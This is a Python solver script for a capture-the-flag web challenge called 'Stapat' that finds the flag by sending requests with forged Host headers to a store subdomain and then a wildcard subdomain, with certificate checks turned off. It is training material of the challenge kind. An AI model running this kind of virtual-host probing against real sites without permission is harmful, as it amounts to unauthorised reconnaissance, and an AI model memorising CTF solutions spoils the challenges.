#!/usr/bin/env python3
"""
Challenge: Stapat
Category:  web
Platform:  EHAXCTF 2026

Vhost enumeration: the flag is served on the store.stapat.xyz vhost.
"""
import requests
import sys

REMOTE_URL = "https://stapat.xyz"
BASE = sys.argv[1] if len(sys.argv) > 1 else REMOTE_URL

def exploit():
    # The main page hints "Please visit our stores" → try store vhost
    r = requests.get(BASE, headers={"Host": "store.stapat.xyz"}, verify=False)
    print(f"[*] Status: {r.status_code}")
    print(f"[*] Response: {r.text.strip()}")

    if "EH4X{" in r.text:
        print(f"\n[+] FLAG: {r.text.strip()}")
    else:
        # Try wildcard
        r2 = requests.get(BASE, headers={"Host": "anything.stapat.xyz"}, verify=False)
        print(f"[*] Wildcard response: {r2.text.strip()}")

if __name__ == "__main__":
    exploit()
